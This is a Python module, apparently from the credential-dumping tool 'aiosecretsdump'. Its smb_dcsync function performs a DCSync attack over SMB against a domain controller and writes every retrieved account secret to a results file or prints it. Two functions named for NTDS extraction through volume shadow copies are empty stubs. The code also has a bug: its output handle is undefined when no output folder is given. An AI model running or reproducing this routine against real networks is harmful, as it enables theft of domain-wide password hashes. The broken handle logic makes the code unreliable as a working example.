
from pathlib import Path
import traceback
from tqdm import tqdm

from aiosecretsdump import logger


async def smb_dcsync(machine, outfolder = None, show_pbar = True):
	try:
		logger.info('[+] Starting DCSYNC on %s' % machine.connection.target.get_hostname_or_ip())
		pbar = None
		if show_pbar is True:
			pbar = tqdm(unit=' users', desc='DCSYNC %s' % machine.connection.target.get_hostname_or_ip())
		if outfolder is not None:
			of = open(outfolder.joinpath('results.txt'), 'w')
		async for secret, err in machine.dcsync():
			if err is not None:
				return False, err

			if pbar is not None:
				pbar.update()

			if of is not None:
				of.write(str(secret))

			if of is None:
				print(str(secret))
		
		logger.info('[+] DCSYNC on %s finished!' % machine.connection.target.get_hostname_or_ip())
		return True, None

	except Exception as e:
		return False, e

async def smb_vss_ntds(machine):
	pass

async def smb_vss_ntds2(machine):
	pass

